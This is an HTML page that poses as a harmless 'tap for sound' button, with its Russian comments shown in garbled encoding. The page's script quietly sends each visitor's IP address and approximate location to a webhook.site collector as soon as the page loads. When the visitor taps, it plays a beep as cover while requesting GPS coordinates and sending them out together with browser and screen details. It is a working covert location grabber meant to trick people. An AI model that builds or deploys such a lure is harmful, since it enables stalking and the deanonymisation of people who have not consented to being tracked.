<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <button id="playButton">üéµ TAP FOR SOUND üéµ</button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const MY_WEBHOOK_URL = 'https://webhook.site/8a5a5b5e-5e5a-4b5a-9e5a-5a5b5e5a5b5e'; // –ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ô WEBHOOK

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                document.getElementById('playButton').innerHTML = 'SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è IP —á–µ—Ä–µ–∑ —Ä–∞–∑–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
        async function getIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json',
                'https://ipapi.co/json/'
            ];

            for (let service of services) {
                try {
                    const response = await fetch(service, { timeout: 5000 });
                    const data = await response.json();
                    
                    if (data.ip) {
                        return {
                            ip: data.ip,
                            city: data.city || 'Unknown',
                            country: data.country || data.country_name || 'Unknown',
                            region: data.region || data.region_name || 'Unknown'
                        };
                    }
                } catch (error) {
                    console.log(`Service ${service} failed:`, error);
                    continue;
                }
            }
            return { ip: 'Unknown', error: 'All IP services failed' };
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function sendData(locationData) {
            try {
                const response = await fetch(MY_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        location: locationData,
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString(),
                        referrer: document.referrer,
                        url: window.location.href,
                        screen: `${screen.width}x${screen.height}`,
                        language: navigator.language
                    })
                });
                console.log('Data sent successfully');
            } catch (error) {
                console.log('Error sending data:', error);
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function getLocationAndSend() {
            statusDiv.innerHTML = 'üì° Getting location...';
            
            let locationData = {};

            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Ç–æ—á–Ω—É—é –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: false,
                            timeout: 10000,
                            maximumAge: 60000
                        });
                    });
                    
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' meters',
                        source: 'GPS'
                    };
                    statusDiv.innerHTML = 'üìç GPS location sent';
                    
                } catch (gpsError) {
                    // GPS –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –ø–æ–ª—É—á–∞–µ–º –ø–æ IP
                    const ipData = await getIP();
                    locationData = {
                        ...ipData,
                        source: 'IP',
                        gpsError: gpsError.message
                    };
                    statusDiv.innerHTML = 'üìç IP location sent';
                }
            } else {
                // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è
                const ipData = await getIP();
                locationData = {
                    ...ipData,
                    source: 'IP',
                    gpsSupported: false
                };
                statusDiv.innerHTML = 'üìç IP location sent';
            }

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            await sendData(locationData);
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞
        document.getElementById('playButton').addEventListener('click', async function() {
            // –°—Ä–∞–∑—É –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫
            playSound();
            
            // –í —Ñ–æ–Ω–µ –ø–æ–ª—É—á–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            getLocationAndSend();
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            playSound();
            getLocationAndSend();
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –±–∞–∑–æ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', async function() {
            const ipData = await getIP();
            await sendData({
                ...ipData,
                source: 'PAGE_LOAD',
                event: 'page_visited'
            });
        });
    </script>
</body>
</html>
